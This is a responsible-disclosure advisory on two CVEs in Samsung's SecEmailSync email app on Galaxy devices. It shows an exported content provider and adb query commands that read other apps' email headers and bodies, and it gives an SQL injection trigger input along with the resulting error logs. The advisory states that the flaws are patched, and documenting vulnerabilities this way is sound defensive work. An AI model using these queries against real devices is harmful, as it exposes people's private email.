# Exposed provider and SQLi in SecEmailSync

* *Authors*: Roberto Paleari ([@rpaleari](https://twitter.com/rpaleari)) and Aristide Fattori ([@joystick](https://twitter.com/joystick))
* *Samsung ID*: SVE-2015-5081
* *ID*: CVE-2016-2565 and CVE-2016-2566
* *Notification date*: 29/10/2015
* *Release date*: 02/02/2016

We identified some vulnerabilities and insecure settings in
Samsung proprietary e-mail application, `SecEmailSync`, distributed with recent
Android-based Samsung phones. These vulnerabilities can be exploited by any
local application to access a victim's e-mail messages. The attacker App does
not require any specific privilege, so the attack is quite stealthy.

## Exposed content provider

Recent Samsung Android phones include a proprietary application, named
`SecEmailSync` (package `com.samsung.android.email.sync`). This App exposes
multiple services and content providers, some of which are accessible by any
unprivileged local applications.

Among these, we focused on the content provider `.homecard.OtherProvider`. The
relevant manifest entry follows:

```
<provider android:authorities="com.samsung.android.email.otherprovider" android:exported="true"
android:name="com.samsung.android.email.sync.homecard.OtherProvider"/>

```

As can be seen from this snippet, this provider is exported and can thus be queried
by any other local application, without requiring any specific privilege (CVE-2016-2565).

We investigated the inner workings of this provider and detected it can be
abused to access e-mail messages handled by Samsung proprietary application
(`SecEmail`).

As an example, the following ADB command demonstrates how it is possible to
query the content provider to extract the e-mails sent by a given sender (in
this case, `bobby@mysite.it`):

```
$ adb shell content query --uri content://com.samsung.android.email.otherprovider/header --where bobby@mysite.it
Row: 0 timeStamp=1446119267000, subject=Test email, _id=1997

```

URI `content://com.samsung.android.email.otherprovider/body` also gives access
to the e-mail body:

```
$ adb shell content query --uri content://com.samsung.android.email.otherprovider/body --where bobby@mysite.it
Row: 0 htmlContent=NULL, textContent=Email body

```

It is not even required to know the e-mail address of a valid sender, as
passing "`@`" as the e-mail address would suffice to match all the e-mails
available.

## SQL injection

Even worse, the very same content provider is affected by a SQL injection
(SQLi) issue (CVE-2016-2566). As an example, the following query triggers the vulnerability:

```
$ adb shell content query --uri content://com.samsung.android.email.otherprovider/body --where "test@me'"

```

When this query is processed, the following messages are recorded in the
Android logs (logs have been truncated due to space contraints):

```
E/DatabaseUtils( 5454): android.database.sqlite.SQLiteException: unrecognized token: "') ORDER BY timeStamp COLLATE NOCASE DESC  LIMIT 10" (code 1): , while compiling: SELECT timeStamp, subject, _id FROM Message WHERE (fromList like '%test@me'%') ORDER BY timeStamp COLLATE NOCASE DESC  LIMIT 10
E/DatabaseUtils( 5454): #################################################################
E/DatabaseUtils( 5454): Error Code : 1 (SQLITE_ERROR)
E/DatabaseUtils( 5454): Caused By : SQL(query) error or missing database.
E/DatabaseUtils( 5454):		(unrecognized token: "') ORDER BY timeStamp COLLATE NOCASE DESC  LIMIT 10" (code 1): , while compiling: SELECT timeStamp, subject, _id FROM Message WHERE (fromList like '%test@me'%') ORDER BY timeStamp COLLATE NOCASE DESC  LIMIT 10)
E/DatabaseUtils( 5454): #################################################################
E/DatabaseUtils( 5454):		at android.database.sqlite.SQLiteConnection.nativePrepareStatement(Native Method)
....
E/DatabaseUtils( 5454):		at com.samsung.android.email.provider.provider.database.AbsEmailProvider.query(AbsEmailProvider.java:1986)

```

The SQLi can be obviously exploited to extract arbitrary data from the SQL
tables managed by the content provider.

## Affected devices

We confirm these issues affect the following device models. Other models and
firmware versions are probably affected as well, but they were not tested.

* SM-G920F, build G920FXXU2COH2 (Galaxy S6)

The vulnerabilities discussed in this advisory have already been patched by
Samsung, in their January Android Security Update
([SMR-JAN-2016](http://security.samsungmobile.com/smrupdate.html#SMR-JAN-2016)).
